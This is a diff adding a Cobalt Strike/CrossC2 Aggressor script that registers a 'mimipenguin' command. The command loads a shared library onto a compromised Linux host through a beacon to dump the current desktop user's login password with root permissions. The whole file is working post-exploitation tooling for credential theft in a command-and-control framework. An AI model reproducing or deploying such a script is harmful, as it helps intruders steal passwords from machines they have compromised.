@@ -1,0 +1,19 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+ssh_alias mimipenguin {
+    $taskName = "mimipenguin"; # 该任务的名称
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # task返回值类型定义参考 "#变量定义"
+    $loadlib = "./mimipenguin.so"; # 需要载入的动态库/可执行文件
+
+    $beaconid = $1;
+
+    $transportArg = "blankArg";
+
+    blog($beaconid, "mimipenguin dump login password");
+
+    bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+}
+
+ssh_command_register("mimipenguin", "dump the login password from the current linux desktop", "Use: mimipenguin\nroot permissions\ndump the login password from the current linux desktop");
